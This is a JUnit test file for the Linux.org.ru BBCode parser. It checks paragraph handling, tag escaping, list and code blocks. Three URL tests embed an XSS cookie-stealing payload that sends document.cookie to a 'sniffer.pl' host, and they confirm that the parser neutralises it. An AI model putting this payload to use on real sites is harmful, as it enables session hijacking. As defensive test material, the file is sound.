/*
 * Copyright 1998-2012 Linux.org.ru
 *    Licensed under the Apache License, Version 2.0 (the "License");
 *    you may not use this file except in compliance with the License.
 *    You may obtain a copy of the License at
 *
 *        http://www.apache.org/licenses/LICENSE-2.0
 *
 *    Unless required by applicable law or agreed to in writing, software
 *    distributed under the License is distributed on an "AS IS" BASIS,
 *    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *    See the License for the specific language governing permissions and
 *    limitations under the License.
 */

package ru.org.linux.util.bbcode;


import org.junit.Before;
import org.junit.Test;

import static org.junit.Assert.assertEquals;

public class OldParserTest {
  private LorCodeService lorCodeService;

  @Before
  public void init() {
    lorCodeService = new LorCodeService();
  }


  @Test
  public void pTest() {
    assertEquals("<p>test\ntest1</p><p>test2</p>",
        lorCodeService.parseComment("test\ntest1\n\ntest2", false, false));
  }

  @Test
  public void tagEscapeTest() {
    assertEquals("<p>&lt;br&gt;</p>",
        lorCodeService.parseComment("<br>", false, false));
  }

  @Test
  public void urlEscapeTest() {
    assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">Test</s></p>",
        lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", false, false));
    assertEquals("<p><s>javascript:var c=new Image();c.src=&laquo;http://127.0.0.1/sniffer.pl?&bdquo;+document.cookie;close()</s></p>",
        lorCodeService.parseComment("[url]javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()[/url]", false, false));
  }

  @Test
  public void urlEscapeWithTagsTest() {
    assertEquals("<p><s title=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">T<i>e</i>st</s></p>",
        lorCodeService.parseComment("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]T[i]e[/i]st[/url]", false, false));
  }

  @Test
  public void badListTest() {
    assertEquals("<p>0</p><ul><li>1</li><li>2</li></ul>",
        lorCodeService.parseComment("[list]0[*]1[*]2[/list]", false, false));
  }

  @Test
  public void codeEscapeTest() {
    assertEquals("<div class=\"code\"><pre class=\"no-highlight\"><code>&quot;code&amp;code&quot;</code></pre></div>",
        lorCodeService.parseComment("[code]\"code&code\"[/code]", false, false));
  }

}
